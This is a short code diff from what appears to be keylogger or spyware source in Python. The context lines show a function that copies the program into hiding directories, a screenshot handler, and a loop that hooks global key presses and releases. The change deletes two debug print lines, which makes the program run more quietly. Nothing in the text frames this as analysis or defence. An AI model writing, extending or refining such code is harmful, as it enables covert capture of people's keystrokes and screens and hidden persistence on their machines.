@@ -112,7 +112,6 @@ LCID_DICT = {'0x436': 'Afrikaans - South Africa', '0x041c': 'Albanian - Albania'
 def hide():
     for dir in HIDING_DIRS:
         shutil.copy2(APP_PATH, dir)
-        print("copied to", dir)
 
 
 def screenshot(event):
@@ -223,7 +222,6 @@ def main():
     language = LCID_DICT[get_lang_id()]
 
     while True:
-        print(LCID_DICT[get_lang_id()])
         keyboard.on_press(on_key_press)
         keyboard.on_release(on_key_release)
 
